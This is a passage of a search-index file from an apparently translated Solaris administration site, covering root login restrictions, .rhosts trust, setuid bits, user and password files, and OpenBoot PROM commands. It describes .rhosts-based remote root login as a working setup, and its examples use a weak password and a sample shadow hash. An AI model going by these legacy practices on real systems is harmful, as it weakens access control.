user3-root SU 10/17 09:29 - pts/10 user3-user4 Controling System Access linkNote: There are many variables in the /etc/default/login file. This course, presents only a small subset of the variables.\nThe /etc/default/login file establishes default parameters for users when they log in to the system. The /etc/default/login file gives you the ability to protect the root account on a system. You can restrict root access to a specific device or to a console, or disallow root access altogether.\nTo display the contents of the /etc/default/login file, perform the command:\n# cat /etc/default/login (output edited for brevity) # If CONSOLE is set, root can only login on that device. # Comment this line out to allow remote login by root. # CONSOLE=/dev/console # PASSREQ determines if login requires a password. # PASSREQ=YES The CONSOLE Variable in the /etc/default/login File\nYou can set the CONSOLE variable in the /etc/default/login file to specify one of three possible conditions that restrict access to the root account:\nIf the variable is defined as CONSOLE=/dev/console, the root user can log in only at the system console. Any attempt to log in as root from any other device generates the error message: # rlogin host1 Not on system console Connection closed. If the variable is not defined, such as #CONSOLE=/dev/console, the root user can log in to the system from any device across the network, through a modem, or using an attached terminal. Caution: If the variable does not have a value assigned to it (for example CONSOLE= ) then the root user cannot log in from anywhere, not even the console. The only way to become the root user on the system is to log in as a regular user and then become root by using the su command.\nNote: You can confine root logins to a particular port with the CONSOLE variable. For example, CONSOLE=/dev/term/a permits the root user to log in to the system only from a terminal that is connected to Serial Port A. The PASSREQ Variable in the /etc/default/login File\nWhen the PASSREQ variable in the /etc/default/login file is set to the default value of YES, then all users who had not been assigned passwords when their accounts were created are required to enter a new password as they log in for the first time. If this variable is set to NO, then null passwords are permitted. This variable does not apply to the root user.\nFor regular users, the /etc/hosts.equiv file identifies remote hosts and remote users who are considered to be trusted.\nWhile the /etc/hosts.equiv file applies system-wide access for non-root users, the .rhosts file applies to a specific user.\nAll users, including the root user, can create and maintain their own .rhosts files in their home directories.\nFor example, if you run an rlogin process from a remote host to gain root access to a local host, the /.rhosts file is checked in the root home directory on the local host.\nIf the remote host name is listed in this file, it is a trusted host, and, in this case, root access is granted on the local host. The CONSOLE variable in the /etc/default/login file must be commented out for remote root logins.\nThe $HOME/.rhosts file does not exist by default. You must create it in the user’s home directory.\nGet informations linkThe groups command displays group memberships for the user.\nThe command format for the groups command is:\ngroups [username] For example, to see which groups you are a member of, perform the command:\n# groups other root bin sys adm uucp mail tty lp nuucp daemon\nTo list the groups to which a specific user is a member, use the groups command with the user’s name, such as user5, as an argument.\n# groups user5 staff class sysadmin You use the id command to further identify users by listing their UID number, user name, GID number, and group name. This information is useful when you are troubleshooting file access problems for users.\nThe id command also returns the EUID number and name, and the EGID number and login name. For example, if you logged in as user1 and then used the su command to become user4, the id command reports the information for the user4 account.\nThe command format for the id command is:\nid options username To view your effective user account, perform the command:\n$ id uid=101(user1) gid=300(class) To view account information for a specific user, use a user login name with the id command:\n$ id user1 uid=101(user1) gid=300(class) To view information about the secondary groups of a user, use the -a option and a user login name, such as user1:\n$ id -a user1 uid=101(user1) gid=300(class) groups=14(sysadmin) Set uid, gid \u0026 Sticky bits linkThree types of special permissions are available for executable files and directories. These are:\nThe setuid permission The setgid permission The Sticky Bit permission The setuid Permission on Executable Files linkWhen the set-user identification (setuid) permission is set on an executable file, a user or process that runs this executable file is granted access based on the owner of the file (usually the root user), instead of on who started the executable.\nThis setting allows a user to access files and directories that are typically accessible only by the owner of the executable. Note that many executable programs must be run by the root user, or by sys or bin to work properly.\nUse the ls command to check the setuid permission.\n# ls -l /usr/bin/su -r-sr-xr-x 1 root sys 22292 Jan 15 17:49 /usr/bin/su The setuid permission displays as an “s” in the owner’s execute field.\nNote: If a capital “S” appears in the owner’s execute field, it indicates that the setuid bit is on, and the execute bit “x” for the owner of the file is off or denied.\nThe root user and the owner can set the setuid permissions on an executable file by using the chmod command and the octal value 4###.\nFor example:\n# chmod 4555 executable_file Caution: Except for those setuid executable files that exist by default in the Solaris OS, you should disallow the use of setuid programs or at least restrict their use.\nTo search for files with setuid permissions and to display their full path names, perform the command:\n# find / -perm -4000 The setgid Permission on Executable Files linkThe set-group identification (setgid) permission is similar to the setuid permission, except that when the process runs, it runs as if it were a member of the same group in which the file is a member. Also, access is granted based on the permissions assigned to that group.\nFor example, the write program has a setgid permission that allows users to send messages to other users’ terminals.\nUse the ls command to check the setgid permission.\n# ls -l /usr/bin/write -r-xr-sr-x 1 root tty 11484 Jan 15 17:55 /usr/bin/write The setgid permission displays as an “s” in the group’s execute field.\nNote: If a lowercase letter “l” appears in the group’s execute field, it indicates that the setgid bit is on, and the execute bit for the group is off or denied. This indicates that mandatory file and record locking occurs during file access for those programs that are written to request locking.\nThe root user and the owner can set setgid permissions on an executable file by using the chmod command and the octal value 2###. Here is the command-line format:\n# chmod 2555 executable_file The setgid Permission on Directories\nThe setgid permission is a useful feature for creating shared directories.\nWhen a setgid permission is applied to a directory, files created in the directory belong to the group of which the directory is a member.\nFor example, if a user has write permission in the directory and creates a file there, that file is a member of the same group as the directory and not the user’s group.\nTo create a shared directory, you must set the setgid bit using symbolic mode. Here is the format for that mode:\n# chmod g+s shared_directory To search for files with setgid permissions and display their full path names, perform the command:\n# find / -perm -2000 Sticky Bit Permission on Public Directories linkThe Sticky Bit is a special permission that protects the files within a publicly writable directory.\nIf the directory permissions have the Sticky Bit set, a file can be deleted only by the owner of the file, the owner of the directory, or by the root user. This prevents a user from deleting other users’ files from publicly writable directories.\nUse the ls command to determine if a directory has the Sticky Bit permission set.\n# ls -ld /tmp drwxrwxrwt 6 root sys 719 May 31 03:30 /tmp The Sticky Bit displays as the letter “t” in the execute field for other.\nNote: If a capital “T” appears in the execute field for other, it indicates that the Sticky Bit is on; however, the execute bit is off or denied.\nThe root user and the owner can set the Sticky Bit permission on directories by using the chmod command and the octal value 1###. Here is the command-line format:\n# chmod 1777 public_directory To search for directories that have Sticky Bit permissions and display their full path names, execute the following command:\n# find / -type d -perm -1000 Note: For more detailed information on the Sticky Bit, execute the man sticky command.\n"
            }
        );
    index.add(
            {
                id:  814 ,
                href: "\/Gestion_des_utilisateurs\/",
                title: "User Management",
                description: "A comprehensive guide to user management in Solaris and Linux systems, including account creation, modification, password management, and troubleshooting login issues.",
                content: "Introduction linkHere we’re going to see how to manage users.\npasswd linkDue to the critical nature of the /etc/passwd file, you should refrain from editing this file directly. Instead, you should use the Solaris Management Console or command-line tools to maintain the file.\nThe following is an example of an /etc/passwd file that contains the default system account entries.\nroot:x:0:0:Super-User:/:/sbin/sh daemon:x:1:1::/: bin:x:2:2::/usr/bin: sys:x:3:3::/: adm:x:4:4:Admin:/var/adm: lp:x:71:8:Line Printer Admin:/usr/spool/lp: uucp:x:5:5:uucp Admin:/usr/lib/uucp: nuucp:x:9:9:uucp Admin:/var/spool/uucppublic:/usr/lib/uucp/uucico smmsp:x:25:25:SendMail Message Submission Program:/: listen:x:37:4:Network Admin:/usr/net/nls: gdm:x:50:50:GDM Reserved UID:/: webservd:x:80:80:WebServer Reserved UID:/: nobody:x:60001:60001:NFS Anonymous Access User:/: noaccess:x:60002:60002:No Access User:/: nobody4:x:65534:65534:SunOS 4.x NFS Anonymous Access User:/: Each entry in the /etc/passwd file contains seven fields. A colon separates each field. The following is the format for an entry:\nloginID:x:UID:GID:comment:home_directory:login_shell shadow linkDue to the critical nature of the /etc/shadow file, you should refrain from editing it directly. Instead, maintain the fields of the file by using the Solaris Management Console or command-line tools. Only the root user can read the /etc/shadow file.\nThe following is an example /etc/shadow file that contains initial system account entries.\nroot:rJrdhjNWQQHoY:6445:::::: daemon:NP:6445:::::: bin:NP:6445:::::: sys:NP:6445:::::: adm:NP:6445:::::: lp:NP:6445:::::: uucp:NP:6445:::::: nuucp:NP:6445:::::: smmsp:NP:6445:::::: listen:*LK*::::::: gdm:*LK*::::::: webservd:*LK*::::::: nobody:*LK*:6445:::::: noaccess:*LK*:6445:::::: nobody4:*LK*:6445:::::: Each entry in the /etc/shadow file contains nine fields. A colon separates each field.\nFollowing is the format of an entry:\nloginID:password:lastchg:min:max:warn:inactive:expire: The table defines the requirements for each of the eight fields.\nField Description loginID The user’s login name. password A 13-character encrypted password. The string LK indicates a locked account, and the string NP indicates no valid password. Passwords must be constructed to meet the following requirements:\nEach password must be at least six characters and contain at least two alphabetic characters and at least one numeric or special character. It cannot be the same as the login ID or the reverse of the login ID. lastchg The number of days between January 1, 1970, and the last password modification date. min The minimum number of days required between password changes. max The maximum number of days the password is valid before the user is prompted to enter a new password at login. warn The number of days the user is warned before the password expires. inactive The number of inactive days allowed for the user before the user’s account is locked. expire The date (given as number of days since January 1, 1970) when the user account expires. After the date is exceeded, the user can no longer log in. flag To track failed logins. The count is in low order four bits; the remainder is reserved for future use, set to zero. group linkEach user belongs to a group that is referred to as the user’s primary group. The GID number, located in the user’s account entry within the /etc/passwd file, specifies the user’s primary group.\nEach user can also belong to up to 15 additional groups, known as secondary groups. In the /etc/group file, you can add users to group entries, thus establishing the user’s secondary group affiliations.\nThe following is an example of the default entries in an /etc/group file:\nroot::0: other::1:root bin::2:root,daemon sys::3:root,bin,adm adm::4:root,daemon uucp::5:root mail::6:root tty::7:root,adm lp::8:root,adm nuucp::9:root staff::10: daemon::12:root sysadmin::14: smmsp::25: gdm::50: webservd::80: nobody::60001: noaccess::60002: nogroup::65534:: Each line entry in the /etc/group file contains four fields. A colon character separates each field. The following is the format for an entry:\ngroupname:group-password:GID:username-list The table defines the requirements for each of the four fields.\nField Description groupname Contains the name assigned to the group. Group names contain up to a maximum of eight characters. group-password Usually contains an empty field or an asterisk. This is a relic of earlier versions of UNIX.\nCaution: A group-password is a security hole because it might allow an unauthorized user who is not a member of the group but who knows the group password, to enter the group.\nNote: The newgrp command changes a user’s primary group association within the shell environment from which it is executed. If this new, active group has a password and the user is not a listed member in that group, the user must enter the password before the newgrp command can continue. GID Contains the group’s GID number. It is unique on the local system and should be unique across the organization. Numbers 0 to 99, 60001, 60002 and 65534 are reserved for system group entries. User-defined groups range from 100 to 60000. username-list Contains a comma-separated list of user names that represent the user’s secondary group memberships. By default, each user can belong to a maximum of 15 secondary groups.\nNote: The maximum number of groups is set by the kernel parameter called ngroups_max. You can set this parameter in the /etc/system file to allow for a maximum of 32 groups. Not all applications will be able to reference group memberships greater than 16. NFS is a notable example. The Defaults linkSet values for the following parameters in the /etc/default/passwd file to control properties for all users’ passwords on the system:\nMAXWEEKS - Sets the maximum time period (in weeks) that the password is valid. MINWEEKS - Sets the minimum time period before the password can be changed. PASSLENGTH - Sets the minimum number of characters for a password. Valid entries are 6, 7, and 8. WARNWEEKS - Sets the time period prior to a password’s expiration to warn the user that the password will expire. Note: The WARNWEEKS value does not exist by default in the /etc/default/passwd file, but it can be added.\nThe password aging parameters MAXWEEKS, MINWEEKS, and WARNWEEKS are default values. If set in the /etc/shadow file, the parameters in that file override those in the /etc/default/passwd file for individual users.\nThe Solaris 10 OS release introduces a number of new controls for password management. These controls are configured by setting values in the /etc/default/passwd file.\nNAMECHECK=NO - Sets the password controls to verify that the user is not using their login name as a component of the password. HISTORY=26 - Forces the passwd program to log up to 26 changes to the user’s password. This prevents the user from reusing the same password for 26 changes. Setting the HISTORY value to zero (0) will case the password log for a user to be removed on the next password change. DICTIONLIST= - Causes the passwd program to perform dictionary word lookups. DICTIONDBDIR=/var/passwd - Causes the passwd program to perform dictionary word lookups. Complexity of the password can be controlled using the following parameters:\n#MINDIFF=3 #MINALPHA=2 #MINNONALPHA=1 #MINUPPER=0 #MINLOWER=0 #MAXREPEATS=0 #MINSPECIAL=0 #MINDIGIT=0 #WHITESPACE=YES By default, all of the above parameters are commented out.\nNote: By forcing greater complexity of password structure, you may inadvertently cause the users to write down their passwords as they may be too difficult for the user to remember. When setting a password change policy, you must not underestimate the problems that too much complexity may cause.\nManaging users accounts linkThe Solaris OS provides these command-line tools, defined as follows:\nuseradd - Adds a new user account on the local system usermod - Modifies a user’s account on the local system userdel - Deletes a user’s account from the local system groupadd - Adds a new group entry to the system groupmod - Modifies a group entry on the system groupdel - Deletes a group entry from the system In addition to these standard command-line tools, the Solaris 9 and 10 OS has a set of command-line tools that accomplish the same tasks. They are the smuser and smgroup commands.\nThe smuser command enables you to manage one or more users on the system with the following set of subcommands:\nadd - Adds a new user account modify - Modifies a user’s account delete - Deletes a user’s account list - Lists one or more user entries The smuser and smgroup commands interact with naming services, can use autohome functionality, and are better suited for remote management.\nNote: The smuser and smgroup commands are the command-line interface equivalent to the Solaris Management Console range of operation, and allow you to perform Solaris Management Console actions in scripts. Therefore, the smuser and smgroup commands have numerous subcommands and options designed to function across domains and multiple systems. This module describes only the basic commands.\nThe smgroup command enables you to manage one or more groups on the system with the following set of subcommands:\nadd - Adds a new group entry modify - Modifies a group entry delete - Deletes a group entry list - Lists one or more group entries Any subcommand to add, modify, list, or delete users with the smuser and smgroup commands requires authentication with the Solaris Management Console server and requires the initialization of the Solaris Management Console. For example, the following is the command format for the smuser command:\n/usr/sadm/bin/smuser subcommand [auth_args] -- [subcommand_args] The authorization arguments are all optional. However, if you do not specify the authorization argument, the system might prompt you for additional information, such as a password for authentication purposes.\nThe – option separates the subcommand-specific options from the authorization arguments. The – option must be entered even if an authorization argument is not specified because it must precede the subcommand arguments.\nThe subcommand arguments are quite numerous. For a complete listing of the subcommands, refer to the smuser man page. It is important to note that descriptions and other arguments that contain white space must be enclosed in double quotation marks.\nUse the useradd or smuser add command to add new user accounts to the local system. These commands add an entry for a new user into the /etc/passwd and /etc/shadow files.\nThese commands also automatically copy all the initialization files from the /etc/skel directory to the user’s new home directory.\nuseradd linkThe following is the command format for the useradd command: useradd [ -u uid ][ -g gid ][ -G gid [,gid,.. ]]\n[ -d dir ][ -m ][ -s shell ][ -c comment ] loginname\nThe table shows the options for the useradd command.\nOption Definition -u uid Sets the UID number for the new user -g gid Defines the new user’s primary group -G gid [,gid,..] Defines the new user’s secondary group memberships -d dir Defines the full path name for the user’s home directory -m Creates the user’s home directory if it does not already exist -s shell Defines the full path name for the shell program of the user’s login shell -c comment Specifies any comment, such as the user’s full name and location loginname Defines the user’s login name for the user account -D Displays the defaults that are applied to the useradd command The following example uses the useradd command to create an account for a user named newuser1. It assigns 100 as the UID number, adds the user to the group other, creates a home directory in the /export/home directory, and sets /bin/ksh as the login shell for the user account.\n# useradd -u 100 -g other -d /export/home/newuser1 -m -s /bin/ksh -c \"Regular User Account\" newuser1 64 blocks The useradd command has a preset range of default values. These values can be displayed using the useradd -D command. When this command has been used for the first time, the useradd command generates a file called /var/sadm/defadduser that contains the default values. If the contents of this file are amended, the new contents become the default values for the next time the useradd command is used.\n# ls -l /usr/sadm/defadduser /usr/sadm/defadduser: No such file or directory # useradd -D group=other,1 project=default,3 basedir=/home skel=/etc/skel shell=/bin/sh inactive=0 expire= auths= profiles= roles= limitpriv= defaultpriv= lock_after_retries= # ls -l /usr/sadm/defadduser -rw-r--r-- 1 root root 286 Oct 17 09:04 /usr/sadm/defadduser # cat /usr/sadm/defadduser #\tDefault values for useradd. Changed Sun Oct 17 09:04:27 2004 defgroup=1 defgname=other defparent=/home defskel=/etc/skel defshell=/bin/sh definact=0 defexpire= defauthorization= defrole= defprofile= defproj=3 defprojname=default deflimitpriv= defdefaultpriv= deflock_after_retries= User accounts are locked by default when added with the useradd command. This can be verified by viewing the contents of the /etc/shadow file:\n# grep 'newuser1' /etc/shadow newuser1:*LK*:12708:::::: By convention, a user’s login name is also the user’s home directory name.\nYou use the passwd command to create a password for the new account.\n# passwd newuser1 New Password: 123pass Re-enter new Password: 123pass passwd: password successfully changed for newuser1 This password setting can be verified by viewing the contents of the /etc/shadow file:\n# grep 'newuser1' /etc/shadow newuser1:M0/jo1fmSbYio:12708:::::: smuser add linkThe following is the command format for the smuser add command:\nsmuser add [auth_args] – [subcommand_args]\nThe table shows some of the most common subcommand arguments for the smuser add command.\nSubcommand Argument Definition -c comment A short description of the login, typically the user’s name. This string can be up to 256 characters. -d dir Specifies the home directory of the new user and is limited to 1024 characters. -g group Specifies the new user’s primary group membership. -G group Specifies the user’s secondary group membership. -n name Specifies the user’s login name. -s shell Specifies the full path name of the user’s login shell. -u uid Specifies the user ID of the user you want to add. If you do not specify this option, the system assigns the next available unique UID greater than 100. -x autohome=Y N The following example uses the smuser add command to create an account for a user named newuser2. It designates the login name as newuser2, assigns the UID number 500, adds the user to the group other, creates a home directory in the /export/home directory, and sets /bin/ksh as the login shell for the user account.\nNote: The -x autohome=N option to the smuser command adds the user without automounting the user’s home directory. See the man page for automount for more information.\n# /usr/sadm/bin/smuser add -- -n newuser2 -u 500 -g other -d /export/home/newuser2 -c \"Regular User Account 2\" -s /bin/ksh -x autohome=N Authenticating as user: root Type /? for help, pressing accepts the default denoted by [ ] Please enter a string value for: password :: Enter_The_root_Password Loading Tool: com.sun.admin.usermgr.cli.user.UserMgrCli from sys-02 Login to sys-02 as user root was successful. Download of com.sun.admin.usermgr.cli.user.UserMgrCli from sys-02 was successful. Users are added without a password by default with the smuser command. This can be verified by viewing the appropriate entry in the /etc/shadow file:\n# grep 'newuser2' /etc/shadow newuser2::12708:::::: Use the passwd command to create a new password for the user.\n# passwd newuser2 New Password: 123pass Re-enter new Password: 123pass passwd: password successfully changed for newuser2 Confirm that the password change has been applied by viewing the entry for that user in the /etc/shadow file:\n# grep 'newuser2' /etc/shadow newuser2:*LK*:12708:::::: smuser \u0026 usermod link The usermod Command Format and Options The following is the command format for the usermod command:\nusermod [ -u uid [ -o ] ] [ -g gid ] [ -G gid [ , gid . . . ] ] [ -d dir ] [ -m ] [ -s shell ] [ -c comment ] [ -l newlogname] loginname In general, the options for the usermod command function the same as those for the useradd command.\nThe smuser modify Command Format and Options\nThe following is the command format for the smuser modify command:\nsmuser modify [auth_args] -- [subcommand_args] In general, the options for the smuser modify command function the same as for the smuser add command. Refer to the smuser(1M) man page for additional options.\nOthers commands link Use the userdel command or smuser delete command to delete a user’s login account from the system. To manage groups: smgroup add, groupadd, smgroup modify, groupmod, groupdel, smgroup delete Problems linkSome of the most common problems you might encounter as a system administrator are user login problems. There are two categories of login problems: login problems when the user logs in at the command line and login problems when the user logs in from the Common Desktop Environment (CDE).\nThe CDE uses more configuration files, so there are more potential problems associated with logging in from the CDE. When you troubleshoot a login problem, first determine whether you can log in from the command line. Attempt to log in from another system by using either the telnet command or the rlogin command, or click Options from the CDE login panel and select Command Line Login. If you can log in successfully at the command line, then the problem is with the CDE configuration files. If you cannot log in at the command line, then the problem is more serious and involves key configuration files.\nLogin Problems at the Command Line linkThe table presents an overview of common login problems that occur when the user logs in at the command line.\nLogin Problem Description Login incorrect This message occurs when there are problems with the login information. The most common cause of an incorrect login message is a mistyped password. Make sure the that correct password is being used, and then attempt to enter it again. Remember that passwords are case-sensitive, so you cannot interchange uppercase letters and lowercase letters. In the same way, the letter “o” is not interchangeable with the numeral “0” nor is the letter “l” interchangeable with the numeral “1.” Permission denied This message occurs when there are login, password, or NIS+ security problems. Most often, an administrator has locked the user’s password or the user’s account has been terminated. Password will not work at lockscreen A common error is to have the Caps Lock key on, which causes all letters to be uppercase. This does not work if the password contains lowercase letters. No shell This message occurs when the user’s shell does not exist, is typed incorrectly, or is wrong in the /etc/passwd file. No directory! Logging in with home=/ This message occurs when the user cannot access the home directory for one of the following reasons: An entry in the /etc/passwd file is incorrect, or the home directory has been removed or is missing, or the home directory exists on a mount point that is currently unavailable. Choose a new password (followed by the New password: prompt) This message occurs the first time a user logs in and chooses an initial password to access the account. Couldn’t fork a process! This message occurs then the server could not fork a child process during login. The most common cause of this message is that the system has reached its maximum number of processes. You can either kill some unneeded processes (if you are already logged into that system as root) or increase the number of processes your system can handle. Login Problems in the CDE linkProblems associated with logging into the CDE range from a user being unable to login (and returning to the CDE login screen), to the custom environment not loading properly. In general, the system does not return error messages to the user from the CDE. The following is a list of files and directories that provide troubleshooting information about the CDE:\n/usr/dt/bin/Xsession This file is the configuration script for the login manager. This file should not be edited. The first user-specific file that the Xsession script calls is the $HOME/.dtprofile file.\n$HOME/.dtprofile By default, the file does not contain much content, except for examples. It contains a few echo statements for session logging purposes, and the DTSOURCEPROFILE variable is set. But it also contains information about how it might be edited. The user can edit this file to add user-specific environment variables.\nDTSOURCEPROFILE=true This line allows the user’s $HOME/.login file (for csh users) or the $HOME/.profile (for other shell users) to be sourced as part of the startup process.\nSometimes a .login or .profile file contains problem commands that cause the shell to crash. If the .dtprofile file is set to source a .login or .profile file that has problem commands, desktop startup might fail.\nConsequently, no desktop appears. Instead, the system redisplays the Solaris OS CDE login screen. Startup errors from the .login or .profile file are usually noted in the $HOME/.dt/startlog file. Use a Failsafe login Session or a command-line login to debug problem commands in the .login or .profile files.\n$HOME/.dt/sessions This directory structure contains files and directories that configure the display of the user’s custom desktop and determine the applications that start when the user logs in. Look for recent changes to files and for changes to the directory structure. For example, examine the home directory and the home.old directory or a current directory and the current.old directory. Compare the changes. The changes could provide information on a new application or on changes in the saved desktop that cause the user’s login to fail.\n$HOME/.dt Upon removing the entire .dt directory structure, log out, and log back in again for the system to rebuild a default .dt file structure. This action allows the user to get back into the system if the problem with the CDE files cannot be resolved.\n"
            }
        );
    index.add(
            {
                id:  815 ,
                href: "\/OpenBoot_PROM,_gestion_du_%22BIOS%22\/",
                title: "OpenBoot PROM, BIOS Management",
                description: "Learn how to manage and configure the OpenBoot PROM on Sun systems, including diagnostic mode, boot commands, and NVRAM configurations.",
                content: "Introduction linkThe PROM is the equivalent of the BIOS or EFI on a standard x86 system.\nApproach linkTo know your PROM version:\n/usr/platform/`uname -m`/sbin/prtdiag -v or\nprtconf -V NVRAM linkThe NVRAM can be modified by a user to change some options on the machine:\nOnce the NVRAM is stored on the chipset, during the PROM call at boot, it will check the user’s preferences at the NVRAM level in order to apply them.\nDiagnostic linkTo enter Diagnostic mode, press: Stop+D\nTo stop an ongoing diagnostic: Stop+A\nDisabling Keyboard Use linkIf you want to disable the keyboard at boot, edit the file /etc/default/kbd and uncomment this line:\nKEYBOARD_ABORT=disable Save, exit and run this command:\nkbd -i After doing this, you’ll only have access to the Stop+A key sequence.\nPROM Commands linkI intentionally left the descriptions in English to avoid translation errors:\nCommand Description banner Displays the power-on banner boot Boots the system help Lists the main help categories printenv Displays all parameters’ current and default values setenv Sets the specified NVRAM parameter to some value reset-all Resets the entire system; similar to a power cycle set-defaults Resets all parameter values to the factory defaults sifting text Displays the FORTH commands containing text .registers Displays the contents of the registers probe-scsi Identifies the devices on the internal Small Computer System Interface (SCSI) bus probe-scsi-all Identifies the devices on all SCSI buses probe-ide Identifies devices on the internal integrated device electronics (IDE) bus probe-fcal-all Identifies devices on all Fibre Channel loops show-devs Displays the entire device tree devalias Identifies the current boot device alias for the system nvalias Creates a new device alias name nvunalias Removes a device alias name show-disks Displays and allows a selection of device paths for the disks to be used for nvalias sync Manually attempts to flush memory and synchronize file systems test Runs self-tests on specified devices Banner link ok banner Sun Ultra 5/10 UPA/PCI (UltraSPARC-IIi 360MHz), Keyboard Present OpenBoot 3.31, 128 MB (50 ns) memory installed, Serial #11888271. Ethernet address 8:0:20:b5:66:8f, Host ID: 80b5668f. Boot link This provides an interactive mode: ok boot -a Enter filename [kernel/sparcv9/unix]: Enter default directory for modules [/platform/SUNW,UltraAX-i2/kernel /platform/sun4u/kernel /kernel /usr/kernel]: Name of system file [etc/system]: SunOS Release 5.10 Version s10 64-bit Copyright 1983-2004 Sun Microsystems, Inc. All rights reserved. Use is subject to license terms. root filesystem type [ufs]: Enter physical name of root device [/pci@1f,0/pci@1/scsi@8/disk@0,0:a]: To boot from a CD/DVD: ok boot cdrom -s Reconfigure the boot: ok boot -r Enable verbose mode: ok boot -v Help linkHere’s the help command:\nok help Enter 'help command-name' or 'help category-name' for more help (Use ONLY the first word of a category description) Examples: help system -or- help nvramrc Categories: boot (Load and execute a program) nvramrc (Store user defined commands) system configuration variables (NVRAM variables) command line editing editor (nvramrc editor) resume execution devaliases (Device aliases) diag (Diagnostics commands) ioredirect (I/O redirection commands) misc (Miscellaneous commands) ok Here are some examples:\nok help boot ok help nvramrc ok help diag ok help misc printenv linkThis command lists all NVRAM preferences:\nok printenv Variable Name Value Default Value tpe-link-test? true true scsi-initiator-id 7 7 keyboard-click? false false keymap ttyb-rts-dtr-off false false ttyb-ignore-cd true true ttya-rts-dtr-off false false ttya-ignore-cd true true ttyb-mode 9600,8,n,1,- 9600,8,n,1,- ttya-mode 9600,8,n,1,- 9600,8,n,1,- pcia-probe-list 1,2,3,4 1,2,3,4 pcib-probe-list 1,2,3 1,2,3 mfg-mode\toff off diag-level max max #power-cycles 273 output-device screen screen input-device keyboard keyboard boot-command boot boot auto-boot? true true diag-device net net boot-device disk net disk net local-mac-address? false false screen-#columns 80 80 screen-#rows 34 34 use-nvramrc? false false nvramrc devalias pgx24 /pci1f,0 ... security-mode none security-password security-#badlogins 0 diag-switch? false false ok To display only one parameter:\nok printenv boot-device boot-device = disk net Setenv linkIf the autoboot parameter is set to true, the system will boot automatically, otherwise you’ll get a prompt:\nok printenv auto-boot? auto-boot? = true ok ok setenv auto-boot? false auto-boot? = false To turn off the machine, empty the buffers and registers, use this command:\nok reset-all Resetting ... Set-defaults linkTo reset all parameters to default values, use this command:\nok set-defaults Setting NVRAM parameters to default values. ok To reset only one parameter (here diag-level):\nok set-default diag-level Probe linkTo find all available probe commands:\nok sifting probe (f006c954) probe-all (f006c5a0) probe-all (f006c378) probe-ide (f006c1e8) probe-pci-slot (f006bc8c) probe-scsi (f006bd78) probe-scsi-all (f0060fe8) probe-pci (output truncated) This command may hang the system if a Stop-A or halt command has been executed. Please type reset-all to reset the system before executing this command. Do you wish to continue? (y/n) n If portions of Solaris OS were in RAM when the system was suspended, the probe command could shut down the machine. To avoid this:\nok setenv auto-boot? false ok reset-all Otherwise you can use .registers:\nok .registers Normal Alternate MMU Vector 0: 0 0 0 0 1: 0 0 0 0 2: 0 0 0 0 3: 0 0 0 0 4: 0 0 0 0 (output edited for brevity) %PC 0 %nPC 0 %TBA 0 %CCR 0 XCC:nzvc ICC:nzvc Check that all values are at 0, otherwise the system may shut down.\nProbe-scsi linkFor a SCSI device, use this command:\nok probe-scsi Target 1 Unit 0 Disk FUJITSU MAB3045S SUN4.2G17059825M62990 Target 3 Unit 0 Disk IBM DDRS34560SUN4.2GS98E99255C5917 (C) Copyright IBM Corp. 1997. All rights reserved. Target 6 Unit 0 Removable Read Only device SONY CDROM Probe-scsi-all linkSame but for all SCSI devices:\nok probe-scsi-all /pci@1f,0/pci@1/pci@1/SUNW,isptwo@4 Target 3 Unit 0 Disk FUJITSU MAB3045S SUN4.2G1907 Target 4 Unit 0 Removable Tape EXABYTE EXB-8505SMBANSH20090 Probe-ide linkFor IDE devices:\nok probe-ide Device 0 ( Primary Master ) ATA Model : ST 38420A (DISK) Device 1 ( Primary Slave ) Not Present Device 2 ( Secondary Master ) Removable ATAPI Model : CRD-8322B (CD-ROM) Device 3 ( Secondary Slave ) Not Present Show-dev linkTo list all devices:\nok show-devs /SUNW,UltraSPARC-IIi@0,0 /pci@1f,0 /virtual-memory /memory@0,10000000 /pci@1f,0/pci@1 /pci@1f,0/pci@1,1 /pci@1f,0/pci@1,1/ide@3 /pci@1f,0/pci@1,1/SUNW,m64B@2 /pci@1f,0/pci@1,1/network@1,1 /pci@1f,0/pci@1,1/ebus@1 /pci@1f,0/pci@1,1/ide@3/cdrom /pci@1f,0/pci@1,1/ide@3/disk /pci@1f,0/pci@1,1/ebus@1/SUNW,CS4231@14,200000 /pci@1f,0/pci@1,1/ebus@1/flashprom@10,0 /pci@1f,0/pci@1,1/ebus@1/eeprom@14,0 /pci@1f,0/pci@1/pci@1 /pci@1f,0/pci@1/pci@1/SUNW,isptwo@4 (output truncated) ok Devalias linkTo identify boot devices:\nok devalias screen /pci@1f,0/pci@1,1/SUNW,m64B@2 net /pci@1f,0/pci@1,1/network@1,1 cdrom /pci@1f,0/pci@1,1/ide@3/cdrom@2,0:f disk /pci@1f,0/pci@1,1/ide@3/disk@0,0 disk3 /pci@1f,0/pci@1,1/ide@3/disk@3,0 disk2 /pci@1f,0/pci@1,1/ide@3/disk@2,0 disk1 /pci@1f,0/pci@1,1/ide@3/disk@1,0 disk0 /pci@1f,0/pci@1,1/ide@3/disk@0,0 ide /pci@1f,0/pci@1,1/ide@3 floppy /pci@1f,0/pci@1,1/ebus@1/fdthree ttyb /pci@1f,0/pci@1,1/ebus@1/se:b ttya /pci@1f,0/pci@1,1/ebus@1/se:a keyboard! /pci@1f,0/pci@1,1/ebus@1/su@14,3083f8:forcemode keyboard /pci@1f,0/pci@1,1/ebus@1/su@14,3083f8 mouse /pci@1f,0/pci@1,1/ebus@1/su@14,3062f8 name aliases To boot with the devices above:\nok boot nvalias linkTo create an alias for an existing device:\nnvalias aliasname device_path To put this alias in NVRAM:\ndevalias aliasname device_path Here’s an example:\nok show-disks a) /pci@1f,0/pci@1/scsi@1,1/disk b) /pci@1f,0/pci@1/scsi@1/disk c) /pci@1f,0/pci@1,1/ide@3/cdrom d) /pci@1f,0/pci@1,1/ide@3/disk e) /pci@1f,0/pci@1,1/ebus@1/fdthree@14,3023f0 q) NO SELECTION Enter Selection, q to quit: d /pci@1f,0/pci@1,1/ide@3/disk has been selected. Type ^Y (Control-Y) to insert it in the command line. e.g. ok nvalias mydev ^Y for creating devalias mydev for /pci@1f,0/pci@1,1/ide@3/disk ok nvalias mydisk ^y To copy the selected path, press Ctrl+Y, then add the LUN (Logical Unit Number) of the disk:\nok nvalias mydisk /pci@1f,0/pci@1,1/ide@3/disk@0,0:a To add the boot to this new alias:\nok setenv boot-device mydisk boot-device = mydisk ok boot nvualias linkTo remove an alias:\nok nvunalias aliasname Example:\nok nvunalias mydisk ok setenv boot-device disk boot-device = disk ok reset-all Resetting ... Then use this command to see the parameters:\n/usr/sbin/eeprom eeprom linkTo list all parameters with their values:\neeprom To list only one value:\neeprom boot-device boot-device=disk To 